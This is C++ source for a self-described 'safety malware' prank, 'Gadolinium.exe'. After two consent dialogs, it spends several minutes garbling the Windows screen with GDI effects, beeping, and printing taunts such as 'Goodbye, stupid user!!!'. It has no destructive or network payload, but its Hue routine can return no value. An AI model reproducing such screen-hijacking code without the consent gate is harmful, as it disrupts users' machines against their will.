#include <windows.h>
#define Integer int

Integer red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(Integer length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI MouseDraw(LPVOID lpParam){
	while(1){
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON) ;
		POINT cursor;
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_ERROR));
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI hsl1(LPVOID lpParam)
{
	while(1){
    HDC hdc = GetDC(NULL);
    int x = GetSystemMetrics(SM_CXSCREEN),
        y = GetSystemMetrics(SM_CYSCREEN);

    HBRUSH brush = CreateSolidBrush(Hue(360));
    SelectObject(hdc, brush);
	BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, PATCOPY);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
    Sleep(10);
	}
}
DWORD WINAPI lines(LPVOID lpParam)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int x, y;
	x = GetSystemMetrics(SM_CXSCREEN);
	y = GetSystemMetrics(SM_CYSCREEN);
	while(1)
	{
		hdc = GetDC(HWND_DESKTOP);
		LineTo(hdc, rand() % (0 - x), 0);
		LineTo(hdc, rand() % (0 - x), y);
    	ReleaseDC(NULL, hdc);
    	Sleep(10);
	}
}
DWORD WINAPI payload2(LPVOID lpParam){
	HDC desk;
	int sw, sh;
	
	while(1){
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x999999);
		ReleaseDC(0, desk);
		Sleep(4);
	}
}
DWORD WINAPI elipse(LPVOID lpParam)
{
	while(1){
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
    	DeleteObject(brush);
    	ReleaseDC(NULL, hdc);
    	Sleep(10);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h && rand() % 110)
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI shader2(LPVOID lpParam)
{
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6) {
        hdc = GetDC(0); 
		hdcMem = CreateCompatibleDC(hdc);
		hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); 
		GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
            ((BYTE*)(data + i))[2] = (f / 1);
        }
        SetBitmapBits(hbm, w * h * 4, data); 
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(rand() % 100);
    }
}
DWORD WINAPI payload3(LPVOID lpParam)
{
	while(1){
    	HDC hdc = GetDC(NULL);
    	int w = GetSystemMetrics(SM_CXSCREEN),
    	    h = GetSystemMetrics(SM_CYSCREEN);
    	StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCPAINT);
    	StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCPAINT);
    	ReleaseDC(NULL, hdc);
	}

}
DWORD WINAPI payload4(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);
	
	while (TRUE)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int X = GetSystemMetrics(SM_CXSCREEN);
		int Y = GetSystemMetrics(SM_CYSCREEN);
    	HBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225));
        SelectObject(hdc, brush);
		BitBlt(hdc, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), hdc, rand() % (X - 0), rand() % (Y - 0), PATINVERT);
    	DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload5(LPVOID lpParam)
{
	while(1){
    	HDC hdc = GetDC(NULL);
    	int w = GetSystemMetrics(SM_CXSCREEN),
    	    h = GetSystemMetrics(SM_CYSCREEN);
    	StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, 0x999999);
    	StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, 0x999999);
    	ReleaseDC(NULL, hdc);
	}

}
DWORD WINAPI textout(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Gadolinium";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
		Sleep(10);
    }
}
DWORD WINAPI shader3(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h && rand() % 110)
                v = rand() % 2;
                    *((BYTE*)data + 4 * i + v) = 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI circles(LPVOID lpParam)
{
	while(1){
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		Ellipse(hdc, rand() % x, rand() % y, rand() % x, rand() % y);
    	DeleteObject(brush);
    	ReleaseDC(NULL, hdc);
    	Sleep(10);
	}
}
DWORD WINAPI textout1(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Gadolinium";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI textout2(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"AMOGUS!!!";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI textout3(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"WHAT HAVE YOU DONE!!!";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI textout4(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"THIS IS THE END!";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI textout5(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Goodbye, stupid user!!!";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI beep1(LPVOID lpParam)
{
	while(1){
		Beep(rand() % 2555, rand() % 25);
	}
}

int main(){
    if (MessageBoxW(NULL, L"The software you just executed is considered safety malware.\r\n\
This safety malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS SAFETY MALWARE, NOT RESULTING IN AN UNUSABLE MACHINE?", L"Gadolinium.exe (safety version)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR (pankoza) IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Gadolinium.exe (safety version)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
        	HANDLE thread0 = CreateThread(0, 0, MouseDraw, 0, 0, 0);
        	HANDLE thread1 = CreateThread(0, 0, hsl1, 0, 0, 0);
        	HANDLE thread1dot1 = CreateThread(0, 0, lines, 0, 0, 0);
        	HANDLE beeps1 = CreateThread(0, 0, beep1, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            TerminateThread(thread1dot1, 0);
            CloseHandle(thread1dot1);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
        	HANDLE thread2dot1 = CreateThread(0, 0, elipse, 0, 0, 0);
        	Sleep(30000);
        	TerminateThread(thread2, 0);
            CloseHandle(thread2);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread3 = CreateThread(0, 0, shader1, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread4 = CreateThread(0, 0, hsl1, 0, 0, 0);
        	HANDLE thread4dot1 = CreateThread(0, 0, elipse, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread5 = CreateThread(0, 0, shader2, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread6 = CreateThread(0, 0, payload3, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread7 = CreateThread(0, 0, payload4, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread8 = CreateThread(0, 0, hsl1, 0, 0, 0);
        	HANDLE thread8dot1 = CreateThread(0, 0, lines, 0, 0, 0);
        	Sleep(30000);
        	HANDLE thread8dot2 = CreateThread(0, 0, textout, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread9 = CreateThread(0, 0, shader3, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
            TerminateThread(thread8dot1, 0);
            CloseHandle(thread8dot1);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
            TerminateThread(thread8dot2, 0);
            CloseHandle(thread8dot2);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread10 = CreateThread(0, 0, payload5, 0, 0, 0);
        	HANDLE thread10dot1 = CreateThread(0, 0, circles, 0, 0, 0);
        	Sleep(30000);
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            InvalidateRect(0, 0, 0);
            TerminateThread(thread10dot1, 0);
            CloseHandle(thread10dot1);
            InvalidateRect(0, 0, 0);
        	Sleep(100);
        	HANDLE thread11 = CreateThread(0, 0, textout, 0, 0, 0);
        	HANDLE thread11dot1 = CreateThread(0, 0, textout2, 0, 0, 0);
        	HANDLE thread11dot2 = CreateThread(0, 0, textout3, 0, 0, 0);
        	HANDLE thread11dot3 = CreateThread(0, 0, textout4, 0, 0, 0);
        	HANDLE thread11dot4 = CreateThread(0, 0, textout5, 0, 0, 0);
        	Sleep(30000);
		}
	}
}
